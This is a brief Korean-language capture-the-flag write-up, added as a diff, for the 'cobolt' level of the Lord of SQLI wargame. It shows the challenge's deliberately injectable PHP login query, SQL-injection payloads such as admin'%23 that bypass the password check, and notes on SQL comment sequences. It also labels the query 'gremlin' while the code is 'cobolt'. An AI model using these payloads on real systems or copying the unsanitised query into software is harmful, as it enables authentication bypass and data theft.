@@ -1,0 +1,53 @@
+﻿Lord of SQLI (los) cobolt
+
+
+<?php
+  include "./config.php"; 
+  login_chk();
+  dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
+  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
+  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+  $result = @mysql_fetch_array(mysql_query($query)); 
+  if($result['id'] == 'admin') solve("cobolt");
+  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
+  highlight_file(__FILE__); 
+?>
+
+query : select id from prob_gremlin where id='' and pw=''
+
+-> 그냥 md5 없이 조지려면
+
+http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=admin'%23
+
+-> 
+
+query : select id from prob_gremlin where id='admin'#' and pw=''
+
+(id 는 admin 으로 들어가고 # (%23을 통해 뒤는 주석으로 처리해주자.)
+
++ ?id=admin' and pw>'0'%23 이런식으로 치리할 수도 있다.
+
+
+
+- # (%23)  이건 %23으로 써줘야한다
+
+- -- 
+
+- /*
+
+-;%00
+
+admin 조건 맞춰주고 -> pw hash를 아예생각안하려면 pw 조건까지 id 에
+
+내가 써준 뒤 뒤는 주석처리 %23 써주기
+
+
+# (%23) 은 사이라던지 뒤를 띄우든 아니든 상관없는 것 같은데
+
+-- 은 뒤를 띄워줘야되네.. !! 
+
+-- 주석은 뒤를 띄어쓰기 해야됨 (%20) / 띄어쓰기
+
+필터링 없으면 %23 쓰자그냥
